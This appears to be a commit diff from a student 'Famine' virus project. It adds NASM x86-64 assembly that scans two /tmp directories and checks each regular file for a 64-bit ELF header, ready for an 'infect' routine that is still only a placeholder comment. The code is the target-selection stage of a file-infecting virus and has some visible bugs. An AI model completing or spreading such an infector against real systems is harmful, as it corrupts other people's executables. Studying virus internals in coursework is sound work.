ce42a8f7c4e031bb4df8081cf00212609dccfb17
alagroy- <alagroy-@student.42.fr>
2022-02-10 16:08:30 +0100

    adding recon stage

--- srcs/defines.s
+++ srcs/defines.s
@@ -1,7 +1,52 @@
 %ifndef DEFINES_S
 %define DEFINES_S
 
-%define SYS_WRITE  0x01
-%define SYS_EXIT   0x3c
+%define SYS_READ        0x00
+%define SYS_WRITE       0x01
+%define SYS_OPEN        0x02
+%define SYS_CLOSE       0x03
+%define SYS_EXIT        0x3c
+%define SYS_GETDENTS64  0xd9
+
+%define O_RDONLY        0
+%define O_DIRECTORY     0o0200000
+
+struc       linux_dirent64
+    d_ino:          resq    1
+    d_off:          resq    1
+    d_reclen:       resw    1
+    d_type:         resb    1
+    d_name:         resb    255
+endstruc
+
+%define DIRENT_MAX_SIZE 1024
+%define D_RECLEN_SUB    19
+%define DT_REG          8
+
+struc       Elf64_Ehdr
+    e_ident:        resb    16
+    e_type:         resw    1
+    e_machine:      resw    1
+    e_version:      resd    1
+    e_entry:        resq    1
+    e_phoff:        resq    1
+    e_shoff:        resq    1
+    e_flags:        resd    1
+    e_ehsize:       resw    1
+    e_phentsize:    resw    1
+    e_phnum:        resw    1
+    e_shentsize:    resw    1
+    e_shnum:        resw    1
+    e_shstrndx:     resw    1
+endstruc
+
+%define ELFHDR_SIZE     64
+%define ELF_MAGIC       0x464c457f
+%define EI_CLASS        4
+%define EI_DATA         5
+%define ELFCLASS64      2
+%define ELFDATA2LSB     1
+%define ET_EXEC         2
+%define ET_DYN          3
 
 %endif
--- srcs/famine.s
+++ srcs/famine.s
@@ -3,18 +3,108 @@ BITS 64
 %include "defines.s"
 
 section .rodata
-    hello: db "Hello World", 10, 0
-        .len: equ $ - hello
+    dir1: db "/tmp/test", 0
+        .len: equ $ - dir1
+    dir2: db "/tmp/test2", 0
+        .len: equ $ - dir2
+
+section .data
+    dirent: TIMES DIRENT_MAX_SIZE db 0 ; buffer
 
 section .text
     global _start
 
 _start:
-    mov     rdi, 1
-    lea     rsi, [rel hello]
-    mov     rdx, hello.len
-    mov     eax, SYS_WRITE
-    syscall
+    push    rbp
+    mov     rbp, rsp
+    lea     rdi, [rel dir1]
+    call    readdir
+    lea     rdi, [rel dir2]
+    call    readdir
     xor     rdi, rdi
     mov     eax, SYS_EXIT
     syscall
+
+; [rsp] = fd
+; [rsp + 4] = buf_len
+readdir:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x10
+    mov     rsi, O_DIRECTORY | O_RDONLY
+    xor     eax, eax
+    add     eax, SYS_OPEN
+    syscall
+    mov     [rsp], eax
+loop_dir:
+    mov     edi, [rsp]
+    lea     rsi, [rel dirent]
+    mov     rdx, DIRENT_MAX_SIZE
+    xor     eax, eax
+    add     al, SYS_GETDENTS64
+    syscall
+    cmp     eax, 0
+    jle     end_readdir
+    mov     [rsp + 0x4], eax
+    xor     r8, r8
+loop_buf_dirent:
+    cmp     BYTE [dirent + r8 + d_type], DT_REG
+    jne     next_dirent
+    lea     rdi, [dirent + r8 + d_name]
+    call    infect
+next_dirent:
+    add     r8w, [dirent + d_reclen]
+    cmp     r8w, [rsp + 4]
+    jl      loop_buf_dirent
+    jmp     loop_dir
+end_readdir:
+    mov     edi, [rsp]
+    xor     eax, eax
+    add     eax, SYS_CLOSE
+    leave
+    ret
+
+; [rsp]         fd
+; [rsp + 4]     filename
+; [rsp + 0xc]   e_hdr
+infect:
+    push    rbp
+    mov     rbp, rsp
+    sub     rsp, 0x50
+    mov     esi, O_RDONLY
+    mov     eax, SYS_OPEN
+    syscall
+    test    eax, eax
+    js      quit_infect
+    mov     [rsp + 4], rdi
+    je      quit_infect
+    mov     [rsp], eax
+    mov     edi, [rsp]
+    lea     rsi, [rsp + 0xc]
+    mov     rdx, ELFHDR_SIZE
+    mov     eax, SYS_READ
+    syscall
+    lea     rbx, [rsp + 0xc]
+    lea     rax, [rbx + e_ident]
+    cmp     [rax], DWORD ELF_MAGIC
+    jne     close_quit_infect
+    cmp     [rax + EI_CLASS], BYTE ELFCLASS64
+    jne     close_quit_infect
+    cmp     [rax + EI_DATA], BYTE ELFDATA2LSB
+    jne     close_quit_infect
+    mov     ax, [rbx + e_type]
+    cmp     ax, ET_EXEC
+    je      right_type_check
+    cmp     ax, ET_DYN
+    jne     close_quit_infect
+right_type_check:
+    ; infection routine
+close_quit_infect:
+    mov     edi, [rsp]
+    mov     eax, SYS_CLOSE
+    syscall
+quit_infect:
+    leave
+    ret
+
+_end:
